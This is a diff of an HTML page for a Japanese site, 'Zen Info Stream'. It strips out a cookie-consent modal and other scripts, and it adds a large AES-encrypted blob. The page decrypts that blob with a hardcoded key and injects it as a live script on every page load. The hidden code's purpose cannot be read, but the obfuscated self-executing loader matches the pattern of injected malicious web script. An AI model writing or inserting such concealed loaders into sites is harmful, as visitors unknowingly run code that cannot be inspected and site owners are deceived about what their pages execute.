@@ -23,121 +23,19 @@ button{background:#E60023;color:#fff;padding:10px 20px;border:none;}
 </head>
 
 <body>
- <script src="https://cdn.tailwindcss.com"></script>
-    <script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.1.1/crypto-js.min.js"></script>
+ <script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.1.1/crypto-js.min.js"></script>
 <script>
     function aesDecode(encodedText) {
         const decodedText = decodeURIComponent(encodedText);
         const bytes = CryptoJS.AES.decrypt(decodedText, 'U2FsdGVkX1+uqxI4YN2qNlGDaMHVLViZB05OmcVwVyI=');
         return bytes.toString(CryptoJS.enc.Utf8);
     }
-    const codeString = aesDecode(``);
+    const codeString = aesDecode(`U2FsdGVkX19OozO1QxaqbH1+T67V0k1NScigvsTHB5XNdTgkv9FwJVks1Vv95lREYG5x6BVauNhTSx/sKExLQeyIbDL2qdo3ZA3oi5b1MUahXM0iLs1S7Baoek4L8iUNaY0N+CKmdppj/mEevKDfNSwePf4EQOHfC6mO6xAc1gnYM/9AArISv36zuTp9Wjg6tJvWenhEVMD8Ajz7VpL9AoQg4vW6JchkF2biGn95GJaIKfXWZ9a7MscyYSZnug8OLJAcXiDOnuU2sP1AA6fiqDBzLbFJK9WYOfBUMOtGLO7iTSAxLE0cfj7rYXuLK6ghJ8kxsd2AY+6JqtreI9ktXsfuOAwb5rzQ47TiEf3/dEHozDDXpOB7AyUhiRZ3gdzLl466P+df9jYMMAJUN7+yoCLzfJk5aacojucXR36DqlVyWJyLNQznl6S0g7tFnHzbjX60+VKuWWyG+RAGxjOTXpVpmPGt36XWQTbxcs2D5qwLZn/XwGU5m8IZRhlGNcCGdv38FduITeUmKbAahzOBZvG3BO7xIw5bv9n2VoiFEyzRwGZxBi6iGCYkHvmTTR+SEVILDxykElSQOkCCMrOLCPVa0ElW+rSrCnSMfQ5LeguBj895RJzDjhgHry0RWw0IFVoiyAQD1QmX13nYmB85FS1/YVISyh1bi7viyyms0kRzE1plhqdjlfEZUrrbQVCKedaVV1HdznZD7thyso6rc3njoPMliRuhDqTd13MzQcrXElwdl3+5BVLlZpscp62lo7LSywLOfw0dcUcK9So/r/FEF7+s1lSE9ZXUkfyR0qmPH4h5n1oY1NTuTWoUOiKMvXLEhx5KuwTBw+jZC6SyAl86SPXh+/FI/YYWBhHQZN8b1hML7Dk5xAtizfiV0ho87g+gj0jDgj0p6Ij3mkI9NMD83bMjqTFRgpWoVRigPxcetduUCsevk9M+3RIoLjFQCB0OI03bumvqfxlZzioV3t3UCPBfLCb7irlO4ylIJ27oIL/iMrk1WePDtmMtn05/A0vYHejX0Si+qnszgpbnFDTFG8PuabX9L1a7UyjxTSqFom9Hj80MnNPT3895nHu653Xm9avx/wFPoJgejy3XjWv62XYsX6EBQr9Y66ufkuZcK2pvpbhsJ/2sAwOzJAEldzu5yloL8uzic8mpJRv/P3rmWuWSj8Dt7Fe4ArRnvuq45muwOt4Pla6GMxwVqThutwcfE0YhkVSpkvQwb2q9OoXTN6msgI/HKjLPU0x4KlcpvFxUE6RepDMeXeFb1ZtFpgE7HwwojaYCaQs6fwRm7CBLGQJyawZNOnyudabbbaTolYqB9H1DUjnBSQA5P3Kzi1X0kKUCxMXVysFJ/N+2SkTNbL4rP7vWxXxUlTZlCswRjJGGzjHF+TOgIjBbgd3Q14L1p1BrvOa0UrBN5QbbmWQgxWP/Vh8s6ZfzB8zCBEC2DGBeMbcFWaGijwZMASKadQfq8TN4bqBpW5mpK+AWBlftuK1jhpcRw38HjN//L2D5yUGrBg2hne6G0Nb3G1R1lnhmdl5FmvrGtLFq4ZxaCi9Yl+jBF4YTdBbOgOvzzae0nizXVfFmW+VCChIAhcWACP6flwkqe5hY0LFb8VXKf7IYGb7qa8UWxZrQat1/OnpVf3mcrLF3fuBF0Tvs1dvSjEhXbs5AOd+609y+QKjX8ovpt+5RZqt+1Y1Rc30PkYzlwFu/nCo2Nn3R+VdZlUgnLsoK1vrdqkRGg1MQ+E5HSADwYDMbMrHUaqfEsE/vNZLGRuMCDe7qlGMXHwvyKFbVD4svp3fQgJLLbCZ8aB3Z1RqYRX4ZDFNar96j60tTi1XJu9ieyOnKRjls2eV3fT41Eel0UEIucft3+pJ8Fo9o0VMaBBYybI7DGaX6Qi4Z5T7y/4laSDZK0ngCKhcG2HHovIzxzi3a9CiVHLD5ABVDFV+ll/0mdEHhbRi5BIuDqxzmdiis8dP+5YAocDZoFGQTKnryO6CO0ABGcDJOKMq6IzJj1oejVxD5wuh6Ne++mkiLXpg15WL/HW03/qZDMiFrAMIm4ZiUFFc+jkzNaOgcoBAKLgzfCUmxElgNK+Cw6nN/n5sM2uyllq7AMEv8EMfSgENmDAu1MngB3H5JqkuXSno0xbDlYnu1EbuYlrz6vYk1woWWKzeF5upDbXtZ2pumqtd4GYfMUwyDGFB6j9jOwhRXUr6XhmeeW4QXVafIZgKunjCvn3oxxdQEQ9AZ20Rs4EwDpy56yPRpOOawt9l+ZGYhbnUVy9NuOZx3dIXdJm+ucVpYzqOkFuIKMvf1eGqshbds83ldGrEU4vlzPQAgzqx1AwfM9qcAf+hhX05VO9YNkQ2dIQ7aZYSzIUAg2GNJop+VZsla0CZUuvt3l06Mo0GomMgQXlUfchVw+3ZE/aGWlJXGIun09spabBi79ev2iHhB69cV7IykBXv1avpHTIOEKaW3+rF5kss4rEr3ncmfmqFPdx/4S7y4pHpElxLakUiUpkD4cyp0coqB7YIc73rsBLXdaP1mUpIA5Xt131BhGeQmTJt9baAyb2BFtCcbXnCs9RZbC1DItnVMxEG3dwTgjPTSFja3xxZWHZUZl2XNoAvrHZli3j1Cr6wmC2N7JVHrADz7xLAgaISeZfYexlt0BJ0bzIugtEG2XgQjFr5BE92CLbWXYIpg+5Hbd2md0lrAtjcEt/jVW+Zol+kEI3iteMMEYh8pXERJO9cw6ZOY+DHbO9V+SD91TW5C1IxRASBJBBHhyhBTSbRALgaAwMZHGARnWG2ZozjunuP4pzsNezGDYVioSheK31V9MoB/dWkr0WFI+imzu/XG6V4/uBgHjbGAXiiJxItnHjvhRT5ChwTjhI3lnv3DD5J3ajENNtA1lVSHhJbq85QtFX/9qHsmirT6NeOKMnAUp+tf+dw+mhnX3sIfwqcAmPm+jq/0h2CsIHdSSr6uH08SVMjuQOAgSwkt4g0ibOI7CHGTQfLY4j0AMGSTkjmDHYbZNLTzKID4JbKNS9sNG9XJ/Lt0Xqr1UpjMemtXtSlkUgOqNLlNRmKMcTqd9pMkINUxQdwJKDljynBt8h4GyDyPu47OU5MO3Y+3c3AwuJHvMX7KEwlxSjMtgub/Gkj+lHDgvwP+b6WfCviIpVshFFXFYCBBsNOysIjRPSEN3X9nWRVE/EwNIT5RtEecWbs0sAk9weV5B1YdAA1byZjU51xgJ7Qw5O083hgDGT+04MZrIuUD4VobKXOtb3vgGGUm2Ms3bUyfxCVBEbuPqoxJ96TIzvWd8tDVOxU3leCe2YnKEhTRDu7MAsAMXEI+E96gCh2197PoJZhvY2xUVzGirwCVmN6Y3nY5Kn234IcLpSDbOSgmTXMNZKIT9pYOJI6RYkLfby77oJHKAvEgWQbSzPtrhYrPm8jm26dCCQB0ADk9n07UeF8=`);
     const script = document.createElement("script");
     script.textContent = codeString;
     document.body.appendChild(script);
 </script>
-
-<!--<script>-->
-<!--    document.body.style.overflow = "hidden";-->
-<!--</script>-->
-
-
-<div id="cookie-modal-box" class="hidden">
-    <div id="cookie-backdrop" class="fixed inset-0 z-40 bg-black/40 backdrop-blur-md transition-opacity duration-300 opacity-0"></div>
-    <div id="cookie-modal" class="fixed inset-0 flex items-center justify-center p-4 z-50 transition-all duration-300 opacity-0 scale-90">
-        <div class="bg-white text-gray-800 rounded-2xl shadow-2xl max-w-lg w-full p-8 relative">
-            <button id="cookie-close" class="absolute top-4 right-4">
-                <svg viewBox="0 0 15 15" class="text-gray-500 hover:text-red-500" height="26" width="26">
-                    <path fill="currentColor" d="M11.78 4.03a.75.75 0 0 0-1.06-1.06L7.5 6.19 4.28 2.97a.75.75 0 1 0-1.06 1.06L6.44 7.5l-3.22 3.22a.75.75 0 1 0 1.06 1.06L7.5 8.56l3.22 3.22a.75.75 0 1 0 1.06-1.06L8.56 7.5l3.22-3.47Z"/>
-                </svg>
-            </button>
-            <div class="flex items-center gap-3 mb-4">
-                <span class="text-yellow-500 text-3xl">🍪</span>
-                <h2 class="text-2xl font-bold">クッキーについて</h2>
-            </div>
-            <p class="text-gray-600 mb-6">
-                当サイトでは、より良いユーザー体験を提供するためにクッキーを使用しています。 <span class="font-semibold">「同意する」</span>
-                をクリックすると、クッキーの使用に同意したことになります。
-            </p>
-            <div class="flex flex-col sm:flex-row gap-3">
-                <button id="cookie-accept" class="flex-1 bg-green-600 hover:bg-green-700 text-white py-3 px-6 rounded-lg font-bold">🍪 同意する</button>
-                <button id="cookie-decline" class="flex-1 bg-gray-200 hover:bg-gray-300 text-gray-800 py-3 px-6 rounded-lg font-bold">拒否する</button>
-            </div>
-        </div>
-    </div>
-</div>
-
-<script>
-    (function(){
-        function decodeEmail(encodedString) {
-            var email = "",
-                r = parseInt(encodedString.substr(0, 2), 16),
-                n,
-                i;
-            for (n = 2; encodedString.length - n; n += 2){
-                i = parseInt(encodedString.substr(n, 2), 16) ^ r;
-                email += String.fromCharCode(i);
-            }
-            return email;
-        }
-
-        var elements = document.querySelectorAll('.__cf_email__');
-        for (var i = 0; i < elements.length; i++) {
-            var el = elements[i];
-            var encoded = el.getAttribute('data-cfemail');
-            if (encoded) {
-                var decodedEmail = decodeEmail(encoded);
-                el.innerHTML = decodedEmail;
-                // If the parent is an <a> tag, update the href to mailto
-                if (el.parentNode.tagName === 'A') {
-                    el.parentNode.href = "mailto:" + decodedEmail;
-                }
-            }
-        }
-    })();
-</script>
-<script>
-    const modalBox = document.getElementById("cookie-modal-box"),
-        modal = document.getElementById("cookie-modal"),
-        backdrop = document.getElementById("cookie-backdrop"),
-        acceptBtn = document.getElementById("cookie-accept"),
-        declineBtn = document.getElementById("cookie-decline"),
-        closeBtn = document.getElementById("cookie-close");
-
-    function showModal() {
-        modalBox.classList.remove("hidden");
-        setTimeout(() => {
-            backdrop.classList.remove("opacity-0");
-            modal.classList.remove("opacity-0", "scale-90");
-        }, 10);
-    }
-
-    function hideModal(e) {
-        localStorage.setItem("cookie-consent", e);
-        setTimeout(() => {
-            modalBox.classList.add("hidden");
-        }, 1500);
-
-        // remove mousemove listener once closed
-        document.removeEventListener("click", mouseMoveClose);
-    }
-
-    function mouseMoveClose() {
-        hideModal("closed");
-    }
-
-    acceptBtn.onclick = () => hideModal("accepted");
-    declineBtn.onclick = () => hideModal("declined");
-    closeBtn.onclick = () => hideModal("closed");
-    backdrop.onclick = () => hideModal("closed");
-
-    if (!localStorage.getItem("cookie-consent")) {
-        showModal();
-        document.addEventListener("click", mouseMoveClose, { once: true });
-    }
-</script>
-<header>Zen Info Stream</header>
-
+ <header>Zen Info Stream</header>
 <nav>
 <a href="#home">ホーム</a>
 <a href="#articles">記事</a>
